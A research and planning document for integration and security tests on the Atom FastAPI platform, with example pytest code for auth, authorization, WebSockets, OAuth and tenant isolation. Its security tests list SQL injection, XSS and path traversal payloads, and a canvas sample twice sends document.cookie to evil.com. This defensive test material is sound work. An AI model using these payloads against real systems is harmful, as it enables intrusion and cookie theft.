# Phase 3: Integration & Security Tests - Research

**Researched:** February 10, 2026
**Domain:** Python Testing, FastAPI Integration Testing, Security Testing, OWASP Top 10
**Confidence:** HIGH

## Summary

Phase 3 focuses on implementing comprehensive integration and security tests for the Atom platform. Integration tests validate component interactions (API endpoints, database operations, WebSocket messaging, external services) while security tests protect against authentication bypasses, authorization flaws, and input validation vulnerabilities (OWASP Top 10).

**Key findings:**
- Atom already has strong testing infrastructure: pytest-xdist parallel execution, factory_boy fixtures, transaction rollback pattern, 92 validated bugs across property tests
- FastAPI TestClient is the standard for integration testing with dependency_overrides for mocking
- pytest-asyncio with auto mode is required for WebSocket and async endpoint testing
- Security testing must cover: JWT validation, OAuth flows, agent maturity permissions, action complexity matrix, SQL injection, XSS, path traversal, canvas JavaScript security
- Property tests already exist for authentication, authorization, input validation, WebSocket invariants - integration tests should complement these with real component interaction testing

**Primary recommendation:** Use FastAPI TestClient for API integration tests, pytest-asyncio for WebSocket tests, and extend the existing transaction rollback pattern with factory_boy fixtures. Build security tests as separate test files focusing on authentication flows, authorization checks, and OWASP Top 10 vulnerabilities (SQL injection, XSS, path traversal, CSRF).

## User Constraints

No CONTEXT.md exists for this phase. This is a fresh phase with no user decisions yet.

**Phase Requirements:**
- INTG-01: API integration tests validate FastAPI endpoints with TestClient
- INTG-02: Database integration tests use transaction rollback pattern
- INTG-03: WebSocket integration tests test real-time messaging and streaming
- INTG-04: External service mocking tests (LLM providers, Slack, GitHub integrations)
- INTG-05: Multi-agent coordination integration tests
- INTG-06: Canvas presentation integration tests (forms, charts, sheets)
- INTG-07: Browser automation integration tests (Playwright CDP sessions)
- SECU-01: Authentication flow tests (signup, login, logout, session management)
- SECU-02: Authorization tests (agent maturity permissions, action complexity matrix)
- SECU-03: Input validation tests (SQL injection, XSS, path traversal prevention)
- SECU-04: Canvas JavaScript security validation tests
- SECU-05: JWT token validation and refresh tests
- SECU-06: OAuth flow tests (Google, GitHub, Microsoft integrations)
- SECU-07: Episode access control tests (multi-tenant isolation)

**Prior decisions from Phase 1 & 2:**
- Used pytest-xdist for parallel execution with loadscope scheduling
- Created 6 factory_boy factories for dynamic test data generation (UserFactory, AgentFactory, EpisodeFactory, ExecutionFactory, CanvasFactory)
- Function-scoped db_session fixture with transaction rollback
- Property tests with 100-200 max_examples for critical invariants
- 92 VALIDATED_BUG sections documented across property tests

## Standard Stack

### Core Testing Libraries

| Library | Version | Purpose | Why Standard |
|---------|---------|---------|--------------|
| **pytest** | 7.4+ | Test runner | Industry standard for Python testing, powerful fixtures, parallel execution |
| **FastAPI TestClient** | Built-in | API integration testing | Official FastAPI testing tool, no server startup required, full request/response validation |
| **pytest-asyncio** | 0.21+ | Async test support | Required for WebSocket and async endpoint testing with auto mode |
| **factory_boy** | 3.3+ | Test data generation | Already in use (6 factories), creates dynamic realistic test data |
| **SQLAlchemy** | 2.0+ | Database testing | Transaction rollback pattern, matches production ORM |

### Security Testing Libraries

| Library | Version | Purpose | When to Use |
|---------|---------|---------|-------------|
| **PyJWT** | 2.8+ | JWT validation | Testing JWT token creation, expiration, signature verification |
| **bcrypt** | 4.0+ | Password hashing | Testing password hash verification, bcrypt truncation (72-byte limit) |
| **pytest-xdist** | 3.5+ | Parallel execution | Already configured for loadscope scheduling, speeds up test suite |
| **httpx** | 0.25+ | Async HTTP client | For WebSocket testing and async external service mocking |

### Supporting Libraries

| Library | Version | Purpose | When to Use |
|---------|---------|---------|-------------|
| **freezegun** | 1.4+ | Time mocking | Testing token expiration, session timeouts |
| **responses** | 0.24+ | HTTP mocking | External service mocking (LLM providers, OAuth endpoints) |
| **websockets** | 12.0+ | WebSocket client | Real WebSocket connection testing for integration tests |

### Alternatives Considered

| Instead of | Could Use | Tradeoff |
|------------|-----------|----------|
| FastAPI TestClient | httpx.AsyncClient | TestClient is official, has dependency_overrides, no server startup needed |
| pytest-asyncio | pytest-trio | Asyncio is FastAPI standard, Trio is niche ecosystem |
| factory_boy | Faker alone | factory_boy provides model relationships, Faker alone requires manual setup |
| Transaction rollback | Database truncate + cleanup | Rollback is faster, ensures isolation, truncate is slower and can leave deadlocks |

**Installation:**
```bash
# Core (already installed)
pip install pytest pytest-asyncio pytest-xdist

# Security testing
pip install pyjwt bcrypt

# WebSocket testing
pip install websockets

# External service mocking
pip install responses freezegun

# Already in use
pip install factory_boy sqlalchemy fastapi
```

## Architecture Patterns

### Recommended Project Structure

```
backend/tests/
├── integration/
│   ├── __init__.py
│   ├── conftest.py                 # Integration test fixtures
│   ├── test_api_integration.py     # FastAPI endpoint tests (INTG-01)
│   ├── test_database_integration.py # Database transaction tests (INTG-02)
│   ├── test_websocket_integration.py # WebSocket tests (INTG-03)
│   ├── test_external_services.py   # External service mocking (INTG-04)
│   ├── test_multi_agent_coord.py   # Multi-agent coordination (INTG-05)
│   ├── test_canvas_integration.py  # Canvas presentation tests (INTG-06)
│   └── test_browser_integration.py # Playwright CDP tests (INTG-07)
│
├── security/
│   ├── __init__.py
│   ├── conftest.py                 # Security test fixtures
│   ├── test_auth_flows.py          # Authentication flows (SECU-01)
│   ├── test_authorization.py       # Agent maturity permissions (SECU-02)
│   ├── test_input_validation.py    # SQL injection, XSS, path traversal (SECU-03)
│   ├── test_canvas_security.py     # Canvas JavaScript security (SECU-04)
│   ├── test_jwt_security.py        # JWT validation (already exists, extend) (SECU-05)
│   ├── test_oauth_flows.py         # OAuth flows (SECU-06)
│   └── test_episode_access.py      # Episode access control (SECU-07)
│
├── factories/                      # Already exists
│   ├── __init__.py
│   ├── base.py
│   ├── user_factory.py             # UserFactory, AdminUserFactory
│   ├── agent_factory.py            # AgentFactory, StudentAgentFactory
│   ├── episode_factory.py          # EpisodeFactory
│   ├── execution_factory.py        # ExecutionFactory
│   └── canvas_factory.py           # CanvasFactory
│
└── property_tests/                 # Already exists (78 directories)
    ├── authentication/
    ├── authorization/
    ├── input_validation/
    └── websocket/
```

### Pattern 1: FastAPI TestClient Integration Tests

**What:** Use FastAPI's built-in TestClient for API integration testing without starting a real server.

**When to use:** Testing REST API endpoints, request/response validation, error handling, authentication flows.

**Example:**

```python
# Source: FastAPI Official Testing Documentation
# https://fastapi.tiangolo.com/tutorial/testing/

import pytest
from fastapi.testclient import TestClient
from main_api_app import app

class TestAuthenticationFlows:
    """Integration tests for authentication flows (SECU-01)."""

    def test_user_signup_flow(self, client: TestClient, db_session):
        """Test complete signup flow with email verification."""
        # Given: New user data
        user_data = {
            "email": "test@example.com",
            "password": "SecurePass123!",
            "first_name": "Test",
            "last_name": "User"
        }

        # When: Submit signup request
        response = client.post("/api/auth/signup", json=user_data)

        # Then: Should create user and return tokens
        assert response.status_code == 201
        data = response.json()
        assert data["email"] == "test@example.com"
        assert "access_token" in data
        assert data["token_type"] == "bearer"

        # Verify user in database
        user = db_session.query(User).filter(User.email == "test@example.com").first()
        assert user is not None
        assert user.status == UserStatus.PENDING.value  # Email verification required

    def test_user_login_with_valid_credentials(self, client: TestClient, db_session):
        """Test login with valid credentials returns JWT token."""
        # Given: Existing user
        user = UserFactory(
            email="login@example.com",
            password_hash=hash_password("ValidPass123!")
        )
        db_session.add(user)
        db_session.commit()

        # When: Login with valid credentials
        response = client.post("/api/auth/login", json={
            "email": "login@example.com",
            "password": "ValidPass123!"
        })

        # Then: Should return JWT token
        assert response.status_code == 200
        data = response.json()
        assert "access_token" in data
        assert data["token_type"] == "bearer"

        # Verify JWT structure
        token = data["access_token"]
        payload = jwt.decode(token, SECRET_KEY, algorithms=[ALGORITHM])
        assert payload["sub"] == user.id

    def test_login_with_invalid_credentials(self, client: TestClient):
        """Test login with invalid credentials returns 401."""
        response = client.post("/api/auth/login", json={
            "email": "nonexistent@example.com",
            "password": "WrongPassword"
        })

        assert response.status_code == 401
        assert "incorrect email or password" in response.json()["detail"].lower()
```

**Key Pattern:** Use `client.post()`, `client.get()`, `client.put()`, `client.delete()` for HTTP methods. Validate both status codes and response JSON structure.

### Pattern 2: Database Transaction Rollback

**What:** Wrap each test in a database transaction that rolls back after test completion, ensuring clean database state.

**When to use:** All database integration tests. Already implemented in `property_tests/conftest.py` - reuse this pattern.

**Example:**

```python
# Source: Property Tests Conftest (backend/tests/property_tests/conftest.py)
# Pattern already in use - extend for integration tests

import pytest
from sqlalchemy import create_engine
from sqlalchemy.orm import Session, sessionmaker
from core.database import Base

@pytest.fixture(scope="function")
def db_session():
    """
    Create a fresh in-memory database for each test.

    This ensures complete isolation between test runs.
    Uses transaction rollback pattern.
    """
    # Use in-memory SQLite for fast, isolated tests
    engine = create_engine(
        "sqlite:///:memory:",
        connect_args={"check_same_thread": False},
        echo=False
    )

    # Create all tables
    Base.metadata.create_all(bind=engine)

    # Create session
    TestingSessionLocal = sessionmaker(autocommit=False, autoflush=False, bind=engine)
    session = TestingSessionLocal()

    yield session

    # Cleanup: Transaction rollback happens automatically
    session.close()
    engine.dispose()

@pytest.fixture(scope="function")
def client(db_session: Session):
    """
    Create a FastAPI TestClient with database dependency override.
    """
    from core.dependency import get_db

    # Override the database dependency
    def _get_db():
        try:
            yield db_session
        finally:
            pass  # Transaction rolls back

    app.dependency_overrides[get_db] = _get_db

    with TestClient(app) as test_client:
        yield test_client

    # Clean up
    app.dependency_overrides.clear()
```

**Key Pattern:** Always use function-scoped db_session fixture. Transaction rollback happens automatically on session close. Override FastAPI dependencies with `app.dependency_overrides`.

### Pattern 3: pytest-asyncio WebSocket Tests

**What:** Use pytest-asyncio with auto mode for testing WebSocket connections and real-time messaging.

**When to use:** Testing WebSocket endpoints, real-time streaming, agent guidance canvas updates.

**Example:**

```python
# Source: FastAPI WebSocket Testing Best Practices
# https://www.getorchestra.io/guides/fast-api-testing-websockets-a-detailed-tutorial-with-python-code-examples

import pytest
from websockets.client import connect
import asyncio

@pytest.mark.asyncio(mode="auto")
async def test_websocket_connection_authentication():
    """Test WebSocket connection requires authentication (INTG-03)."""
    # Given: Valid JWT token
    token = create_test_token(user_id="test_user")

    # When: Connect to WebSocket with token
    uri = f"ws://localhost:8000/ws/agent?token={token}"
    async with connect(uri) as websocket:
        # Send authentication message
        await websocket.send(json.dumps({
            "type": "auth",
            "token": token
        }))

        # Receive authentication response
        response = await asyncio.wait_for(websocket.recv(), timeout=5.0)
        data = json.loads(response)

        # Then: Should authenticate successfully
        assert data["type"] == "auth_success"
        assert data["user_id"] == "test_user"

@pytest.mark.asyncio(mode="auto")
async def test_websocket_rejects_invalid_token():
    """Test WebSocket rejects invalid JWT token (SECU-05)."""
    # Given: Invalid/expired token
    invalid_token = "invalid.jwt.token"

    # When: Try to connect
    uri = f"ws://localhost:8000/ws/agent?token={invalid_token}"

    # Then: Should close connection
    with pytest.raises(Exception) as exc_info:
        async with connect(uri) as websocket:
            await websocket.recv()

    assert "401" in str(exc_info.value) or "authentication" in str(exc_info.value).lower()

@pytest.mark.asyncio(mode="auto")
async def test_websocket_real_time_messaging():
    """Test real-time messaging for agent guidance (INTG-03)."""
    # Given: Authenticated connection
    token = create_test_token(user_id="test_user")
    uri = f"ws://localhost:8000/ws/agent?token={token}"

    async with connect(uri) as websocket:
        # Authenticate
        await websocket.send(json.dumps({"type": "auth", "token": token}))
        await websocket.recv()  # auth_success

        # When: Send agent message
        await websocket.send(json.dumps({
            "type": "agent_message",
            "content": "Execute workflow",
            "agent_id": "agent_123"
        }))

        # Then: Should receive real-time update
        response = await asyncio.wait_for(websocket.recv(), timeout=5.0)
        data = json.loads(response)
        assert data["type"] in ["agent_update", "operation_progress"]
```

**Key Pattern:** Always use `@pytest.mark.asyncio(mode="auto")` for async tests. Use `asyncio.wait_for()` to prevent hanging tests. Test both success and failure cases.

### Pattern 4: Security Testing - Authorization

**What:** Test that agent maturity permissions and action complexity matrix are enforced correctly.

**When to use:** Testing authorization guards, permission checks, access control.

**Example:**

```python
# Source: Atom governance system documentation
# CLAUDE.md - Maturity Levels & Action Complexity

class TestAuthorizationPatterns:
    """Integration tests for authorization (SECU-02)."""

    def test_student_agent_cannot_execute_triggers(self, client: TestClient, db_session):
        """
        Test STUDENT agent blocked from automated triggers.

        Maturity: STUDENT (<0.5 confidence)
        Action: Automated trigger (Action Complexity 1-4)
        Expected: BLOCKED → Route to Training
        """
        # Given: STUDENT agent and trigger
        agent = StudentAgentFactory(confidence_score=0.4)
        db_session.add(agent)
        db_session.commit()

        # When: Attempt to execute trigger
        response = client.post(
            f"/api/agents/{agent.id}/trigger",
            headers={"Authorization": f"Bearer {get_admin_token()}"}
        )

        # Then: Should block STUDENT agent
        assert response.status_code == 403
        data = response.json()
        assert "blocked" in data["detail"].lower()
        assert "training" in data["detail"].lower()

    def test_autonomous_agent_can_execute_critical_actions(self, client: TestClient, db_session):
        """
        Test AUTONOMOUS agent can execute critical actions.

        Maturity: AUTONOMOUS (>0.9 confidence)
        Action: Critical deletion (Action Complexity 4)
        Expected: ALLOWED - Full execution
        """
        # Given: AUTONOMOUS agent
        agent = AutonomousAgentFactory(confidence_score=0.95)
        db_session.add(agent)
        db_session.commit()

        # When: Execute critical action
        response = client.delete(
            f"/api/agents/{agent.id}/data",
            headers={"Authorization": f"Bearer {get_admin_token()}"}
        )

        # Then: Should allow AUTONOMOUS agent
        assert response.status_code in [200, 202]  # Success or async accepted

    def test_supervised_agent_requires_approval(self, client: TestClient, db_session):
        """
        Test SUPERVISED agent triggers human approval.

        Maturity: SUPERVISED (0.7-0.9 confidence)
        Action: State change (Action Complexity 3)
        Expected: PROPOSAL ONLY → Human Approval Required
        """
        # Given: SUPERVISED agent
        agent = SupervisedAgentFactory(confidence_score=0.8)
        db_session.add(agent)
        db_session.commit()

        # When: Attempt state change
        response = client.post(
            f"/api/agents/{agent.id}/state",
            json={"new_state": "processing"},
            headers={"Authorization": f"Bearer {get_admin_token()}"}
        )

        # Then: Should require approval
        assert response.status_code == 202  # Accepted for review
        data = response.json()
        assert "proposal_id" in data
        assert data["status"] == "pending_approval"
```

**Key Pattern:** Test all 4 maturity levels (STUDENT, INTERN, SUPERVISED, AUTONOMOUS) against all 4 action complexity levels (1-4). Verify governance enforcement through response codes and status messages.

### Pattern 5: Input Validation Security Testing

**What:** Test for OWASP Top 10 vulnerabilities including SQL injection, XSS, path traversal.

**When to use:** All user input endpoints (forms, API parameters, canvas components).

**Example:**

```python
# Source: OWASP API Security Top 10 2026
# https://owasp.org/www-project-api-security/

class TestInputValidationSecurity:
    """Security tests for input validation (SECU-03)."""

    def test_sql_injection_prevention(self, client: TestClient, db_session):
        """Test SQL injection attempts are blocked (OWASP A01)."""
        # Given: Admin user
        admin = AdminUserFactory()
        db_session.add(admin)
        db_session.commit()

        sql_payloads = [
            "'; DROP TABLE users; --",
            "1' OR '1'='1",
            "admin'--",
            "'; EXEC xp_cmdshell('dir'); --"
        ]

        for payload in sql_payloads:
            # When: Submit SQL injection as user input
            response = client.post(
                "/api/agents/search",
                json={"query": payload},
                headers={"Authorization": f"Bearer {get_token_for_user(admin)}"}
            )

            # Then: Should reject or sanitize input
            # Should NOT return database error
            # Should NOT leak database schema
            assert response.status_code in [400, 422]  # Bad request or validation error
            # Verify no SQL error in response
            assert "sql" not in response.text.lower()
            assert "syntax" not in response.text.lower()
            assert "table" not in response.text.lower()

    def test_xss_prevention(self, client: TestClient, db_session):
        """Test XSS attempts are sanitized (OWASP A03)."""
        # Given: User with permissions
        user = MemberUserFactory()
        db_session.add(user)
        db_session.commit()

        xss_payloads = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "javascript:alert('XSS')",
            "<svg onload=alert('XSS')>",
            "'><script>alert(String.fromCharCode(88,83,83))</script>"
        ]

        for payload in xss_payloads:
            # When: Submit XSS in agent description
            response = client.post(
                "/api/agents",
                json={
                    "name": "Test Agent",
                    "description": payload,
                    "category": "testing"
                },
                headers={"Authorization": f"Bearer {get_token_for_user(user)}"}
            )

            # Then: Should sanitize or escape
            if response.status_code == 201:
                # Verify sanitized in response
                assert "<script>" not in response.text
                assert "javascript:" not in response.text

                # Verify sanitized in database
                agent = db_session.query(AgentRegistry).filter(
                    AgentRegistry.name == "Test Agent"
                ).first()
                assert "<script>" not in agent.description
                assert "javascript:" not in agent.description

    def test_path_traversal_prevention(self, client: TestClient):
        """Test path traversal attempts are blocked (OWASP A01)."""
        path_traversal_payloads = [
            "../../../etc/passwd",
            "..\\..\\..\\..\\windows\\system32\\config\\sam",
            "....//....//....//etc/passwd",
            "%2e%2e%2fetc%2fpasswd",
            "..%252f..%252f..%252fetc%2fpasswd"
        ]

        for payload in path_traversal_payloads:
            # When: Attempt path traversal in file operations
            response = client.post(
                "/api/tools/browser/screenshot",
                json={"file_path": payload},
                headers={"Authorization": f"Bearer {get_admin_token()}"}
            )

            # Then: Should reject path traversal
            assert response.status_code in [400, 403, 404]
            # Should NOT return file contents
            assert "root:" not in response.text

    def test_canvas_javascript_security(self, client: TestClient, db_session):
        """
        Test canvas JavaScript components are validated (SECU-04).

        Canvas custom components with HTML/CSS/JS require security validation.
        JS components require AUTONOMOUS agents only.
        """
        # Given: STUDENT agent (cannot use JS)
        student = StudentAgentFactory()
        db_session.add(student)
        db_session.commit()

        malicious_js = """
        <script>
            fetch('https://evil.com/steal?data=' + document.cookie);
        </script>
        """

        # When: STUDENT agent tries to create JS canvas
        response = client.post(
            "/api/canvas/custom-component",
            json={
                "name": "Malicious Component",
                "html": malicious_js,
                "component_type": "javascript"
            },
            headers={"Authorization": f"Bearer {get_token_for_user(student)}"}
        )

        # Then: Should block STUDENT agent from JS components
        assert response.status_code == 403
        assert "autonomous" in response.json()["detail"].lower()
```

**Key Pattern:** Test all OWASP Top 10 API security vulnerabilities. Use real payload lists (SQL injection, XSS, path traversal). Verify both rejection (status code) and sanitization (database storage). Test agent maturity governance for canvas JavaScript.

### Pattern 6: OAuth Flow Testing

**What:** Test OAuth flows (Google, GitHub, Microsoft) with mocked external providers.

**When to use:** Testing OAuth integration endpoints, token refresh flows.

**Example:**

```python
# Source: Atom OAuth Implementation
# backend/core/oauth_handler.py

import responses
from urllib.parse import parse_qs

class TestOAuthFlows:
    """Integration tests for OAuth flows (SECU-06)."""

    @responses.activate
    def test_github_oauth_flow(self, client: TestClient, db_session):
        """Test complete GitHub OAuth flow."""
        # Given: Mock GitHub endpoints
        responses.add(
            responses.POST,
            "https://github.com/login/oauth/access_token",
            json={
                "access_token": "github_access_token",
                "token_type": "bearer",
                "scope": "user:email"
            },
            status=200
        )

        responses.add(
            responses.GET,
            "https://api.github.com/user",
            json={
                "id": 12345,
                "login": "testuser",
                "email": "test@example.com"
            },
            status=200
        )

        # When: Initiate OAuth flow
        response = client.get("/api/auth/github/authorize")
        assert response.status_code == 200
        auth_url = response.json()["auth_url"]
        assert "github.com" in auth_url

        # Simulate callback with code
        response = client.get(
            "/api/auth/github/callback?code=test_code&state=test_state"
        )

        # Then: Should create user and return token
        assert response.status_code in [200, 302]  # Success or redirect

        # Verify user created
        user = db_session.query(User).filter(
            User.email == "test@example.com"
        ).first()
        assert user is not None

    @responses.activate
    def test_oauth_token_refresh(self, client: TestClient, db_session):
        """Test OAuth token refresh flow (SECU-05, SECU-06)."""
        # Given: User with expired OAuth token
        user = UserFactory(
            email="oauth@example.com"
        )
        db_session.add(user)

        oauth_token = OAuthToken(
            user_id=user.id,
            provider="github",
            _encrypted_access_token=_encrypt_token("expired_token"),
            refresh_token="valid_refresh_token",
            expires_at=datetime.utcnow() - timedelta(hours=1)  # Expired
        )
        db_session.add(oauth_token)
        db_session.commit()

        # Mock refresh endpoint
        responses.add(
            responses.POST,
            "https://github.com/login/oauth/access_token",
            json={
                "access_token": "new_access_token",
                "refresh_token": "new_refresh_token",
                "expires_in": 7200
            },
            status=200
        )

        # When: Request token refresh
        response = client.post(
            "/api/auth/oauth/refresh",
            headers={"Authorization": f"Bearer {get_token_for_user(user)}"}
        )

        # Then: Should refresh token
        assert response.status_code == 200
        data = response.json()
        assert "access_token" in data

        # Verify token updated in database
        db_session.refresh(oauth_token)
        assert oauth_token.access_token == "new_access_token"
```

**Key Pattern:** Use `responses` library to mock external OAuth endpoints. Test complete flow: authorize → callback → token → user creation. Test token refresh with expired tokens.

### Pattern 7: Episode Access Control Tests

**What:** Test multi-tenant isolation for episodes - users can only access their own episodes.

**When to use:** Testing episode retrieval, filtering, access control enforcement.

**Example:**

```python
# Source: Atom Episodic Memory Implementation
# CLAUDE.md - Episodic Memory & Graduation Framework

class TestEpisodeAccessControl:
    """Security tests for episode access control (SECU-07)."""

    def test_user_can_only_access_own_episodes(self, client: TestClient, db_session):
        """Test users cannot access episodes from other users."""
        # Given: Two users with episodes
        user1 = UserFactory(id="user_1", email="user1@example.com")
        user2 = UserFactory(id="user_2", email="user2@example.com")

        episode1 = EpisodeFactory(user_id=user1.id)
        episode2 = EpisodeFactory(user_id=user2.id)

        db_session.add_all([user1, user2, episode1, episode2])
        db_session.commit()

        # When: User1 tries to access User2's episode
        response = client.get(
            f"/api/episodes/{episode2.id}",
            headers={"Authorization": f"Bearer {get_token_for_user(user1)}"}
        )

        # Then: Should deny access
        assert response.status_code == 403
        assert "not authorized" in response.json()["detail"].lower()

        # Verify access log created
        log = db_session.query(EpisodeAccessLog).filter(
            EpisodeAccessLog.episode_id == episode2.id,
            EpisodeAccessLog.user_id == user1.id,
            EpisodeAccessLog.access_denied == True
        ).first()
        assert log is not None

    def test_episode_filtering_respects_isolation(self, client: TestClient, db_session):
        """Test episode list endpoints only return user's own episodes."""
        # Given: Multiple users with episodes
        user1 = UserFactory(id="user_1")
        user2 = UserFactory(id="user_2")

        episodes_user1 = EpisodeFactory.create_batch(5, user_id=user1.id)
        episodes_user2 = EpisodeFactory.create_batch(3, user_id=user2.id)

        db_session.add_all([user1, user2] + episodes_user1 + episodes_user2)
        db_session.commit()

        # When: User1 lists episodes
        response = client.get(
            "/api/episodes",
            headers={"Authorization": f"Bearer {get_token_for_user(user1)}"}
        )

        # Then: Should only return User1's episodes
        assert response.status_code == 200
        data = response.json()
        assert len(data["episodes"]) == 5

        episode_ids = [e["id"] for e in data["episodes"]]
        for episode in episodes_user1:
            assert episode.id in episode_ids
        for episode in episodes_user2:
            assert episode.id not in episode_ids
```

**Key Pattern:** Test cross-user access attempts. Verify access logs are created. Test list endpoints return only user's own data. Verify filtering by user_id is enforced at database level.

## Don't Hand-Roll

| Problem | Don't Build | Use Instead | Why |
|---------|-------------|-------------|-----|
| **FastAPI test client** | Custom HTTP client with requests | `FastAPI TestClient` | Official integration, dependency overrides, no server startup, request validation |
| **Database isolation** | Manual table truncation or cleanup | Transaction rollback pattern | Faster (rollback vs truncate), guaranteed isolation, no deadlocks, already implemented |
| **Test data generation** | Manual object creation with hardcoded data | `factory_boy` factories | Dynamic realistic data, relationships, 6 factories already exist |
| **Async test execution** | Custom asyncio event loop management | `pytest-asyncio(mode="auto")` | Standard pytest async support, handles event loop correctly |
| **OAuth mocking** | Running real OAuth servers or complex stubs | `responses` library | HTTP mocking, deterministic tests, no external dependencies |
| **JWT validation** | Manual token parsing and validation | `PyJWT` library | Official implementation, handles all edge cases (exp, nbf, iss) |
| **Time-based tests** | Manipulating system time manually | `freezegun` library | Deterministic time mocking, works across all datetime calls |
| **WebSocket testing** | Complex async server setup | `websockets` client library | Real WebSocket protocol, async support, message validation |

**Key insight:** Custom test infrastructure is error-prone and hard to maintain. Use established testing libraries that are battle-tested by the community. For example, building a custom HTTP client for FastAPI testing requires handling async, dependency injection, middleware, and error responses - TestClient does all of this correctly out of the box.

## Common Pitfalls

### Pitfall 1: Missing Dependency Overrides in TestClient

**What goes wrong:** Tests use real database instead of in-memory test database, causing data pollution and slow tests.

**Root cause:** Forgetting to override FastAPI dependencies like `get_db` when creating TestClient.

**How to avoid:** Always create a `client` fixture that overrides dependencies:

```python
@pytest.fixture(scope="function")
def client(db_session: Session):
    """Create TestClient with dependency overrides."""
    from core.dependency import get_db

    def _get_db():
        try:
            yield db_session
        finally:
            pass  # Transaction rolls back

    app.dependency_overrides[get_db] = _get_db

    with TestClient(app) as test_client:
        yield test_client

    app.dependency_overrides.clear()  # CRITICAL: Clean up
```

**Warning signs:** Tests fail when run in parallel but pass individually, data from one test appears in another, tests are slow.

### Pitfall 2: Not Using `mode="auto"` in pytest-asyncio

**What goes wrong:** Async tests fail with "no running event loop" or "asyncio.run() cannot be called from a running event loop".

**Root cause:** pytest-asyncio requires explicit mode configuration for async fixtures and tests.

**How to avoid:** Always use `@pytest.mark.asyncio(mode="auto")` for async tests:

```python
@pytest.mark.asyncio(mode="auto")
async def test_websocket_connection():
    # Test code here
    pass

@pytest.fixture
async def async_fixture():
    # Fixture code here
    yield some_async_resource
```

**Warning signs:** "coroutine 'X' was never awaited", "RuntimeError: Event loop is closed", tests hanging indefinitely.

### Pitfall 3: Testing Authentication Without Token Expiration

**What goes wrong:** Tests pass but production fails when tokens expire, authentication bypass vulnerabilities slip through.

**Root cause:** Using long-lived tokens in tests or not testing expiration logic.

**How to avoid:** Use `freezegun` to test token expiration:

```python
from freezegun import freeze_time

def test_expired_token_rejected(client: TestClient):
    """Test expired JWT tokens are rejected."""
    # Given: Token created 1 hour ago
    with freeze_time("2026-02-10 10:00:00"):
        token = create_access_token(data={"sub": "user_123"})

    # When: Use token after expiration
    with freeze_time("2026-02-10 11:30:00"):  # 90 minutes later (expired)
        response = client.get(
            "/api/agents",
            headers={"Authorization": f"Bearer {token}"}
        )

    # Then: Should reject expired token
    assert response.status_code == 401
    assert "expired" in response.json()["detail"].lower()
```

**Warning signs:** Tests always pass regardless of token age, no tests with `freeze_time`, authentication tests only test success cases.

### Pitfall 4: Not Testing Agent Maturity Permission Matrix

**What goes wrong:** STUDENT agents accidentally gain AUTONOMOUS permissions, security vulnerabilities in governance system.

**Root cause:** Only testing happy path, not testing all 4x4 maturity/complexity combinations.

**How to avoid:** Create parameterized tests for all combinations:

```python
import pytest

@pytest.mark.parametrize("agent_status,action_complexity,expected_status", [
    (AgentStatus.STUDENT, 1, 403),  # STUDENT blocked from all
    (AgentStatus.STUDENT, 4, 403),  # STUDENT blocked from critical
    (AgentStatus.INTERN, 1, 202),   # INTERN can present (requires approval)
    (AgentStatus.INTERN, 4, 403),   # INTERN blocked from critical
    (AgentStatus.SUPERVISED, 3, 202),  # SUPERVISED under supervision
    (AgentStatus.AUTONOMOUS, 4, 200),  # AUTONOMOUS full execution
])
def test_maturity_permission_matrix(
    client: TestClient,
    db_session,
    agent_status,
    action_complexity,
    expected_status
):
    """Test all maturity/complexity combinations."""
    agent = AgentFactory(status=agent_status.value)
    db_session.add(agent)
    db_session.commit()

    response = client.post(
        f"/api/agents/{agent.id}/execute",
        json={"action_complexity": action_complexity},
        headers={"Authorization": f"Bearer {get_admin_token()}"}
    )

    assert response.status_code == expected_status
```

**Warning signs:** No tests for STUDENT/INTERN restrictions, only testing AUTONOMOUS agents, no governance enforcement tests.

### Pitfall 5: Not Sanitizing Security Test Payloads

**What goes wrong:** Security tests pass but actual vulnerability exists because payloads aren't realistic.

**Root cause:** Using simplified test payloads instead of real OWASP exploit patterns.

**How to avoid:** Use comprehensive payload lists from security research:

```python
SQL_INJECTION_PAYLOADS = [
    "'; DROP TABLE users; --",
    "1' OR '1'='1",
    "admin'--",
    "'; EXEC xp_cmdshell('dir'); --",
    "1' UNION SELECT NULL, NULL, NULL--",
    "' OR 1=1#",
    "admin'/*",
    "' OR '1'='1'--",
]

XSS_PAYLOADS = [
    "<script>alert('XSS')</script>",
    "<img src=x onerror=alert('XSS')>",
    "javascript:alert('XSS')",
    "<svg onload=alert('XSS')>",
    "'><script>alert(String.fromCharCode(88,83,83))</script>",
    "<iframe src='javascript:alert(XSS)'>",
    "<body onfocus=alert('XSS')>",
]

PATH_TRAVERSAL_PAYLOADS = [
    "../../../etc/passwd",
    "..\\..\\..\\..\\windows\\system32\\config\\sam",
    "....//....//....//etc/passwd",
    "%2e%2e%2fetc%2fpasswd",
    "..%252f..%252f..%252fetc%2fpasswd",
]

@pytest.mark.parametrize("payload", SQL_INJECTION_PAYLOADS)
def test_sql_injection_blocked(client: TestClient, payload):
    """Test all SQL injection payloads are blocked."""
    response = client.post("/api/agents/search", json={"query": payload})
    assert response.status_code in [400, 422]
```

**Warning signs:** Only testing 1-2 payloads, security tests always pass, no false positive testing (intentionally malicious input).

### Pitfall 6: WebSocket Tests Hanging Forever

**What goes wrong:** WebSocket tests hang indefinitely when connection fails or server doesn't respond.

**Root cause:** No timeout on WebSocket receive operations.

**How to avoid:** Always use `asyncio.wait_for()` with timeouts:

```python
@pytest.mark.asyncio(mode="auto")
async def test_websocket_timeout():
    """Test WebSocket connection with timeout."""
    uri = "ws://localhost:8000/ws/agent?token=invalid"

    with pytest.raises((asyncio.TimeoutError, ConnectionRefused)):
        async with connect(uri) as websocket:
            # Timeout after 5 seconds
            response = await asyncio.wait_for(websocket.recv(), timeout=5.0)
```

**Warning signs:** Tests run for >30 seconds, need to manually kill pytest process, intermittent test hangs.

### Pitfall 7: Not Testing Canvas JavaScript Security

**What goes wrong:** Malicious JavaScript in canvas components can steal cookies, redirect users, execute unauthorized actions.

**Root cause:** Canvas security tests only test HTML/CSS, not JavaScript execution risks.

**How to avoid:** Test JavaScript security validation:

```python
def test_canvas_javascript_restricted_to_autonomous(client: TestClient, db_session):
    """Test only AUTONOMOUS agents can use JavaScript in canvas."""
    # Given: STUDENT agent
    student = StudentAgentFactory()
    db_session.add(student)
    db_session.commit()

    malicious_js = """
    <script>
        fetch('https://evil.com/steal?cookie=' + document.cookie);
    </script>
    """

    # When: STUDENT tries to create JS component
    response = client.post(
        "/api/canvas/custom-component",
        json={
            "name": "Malicious",
            "html": malicious_js,
            "component_type": "javascript"
        },
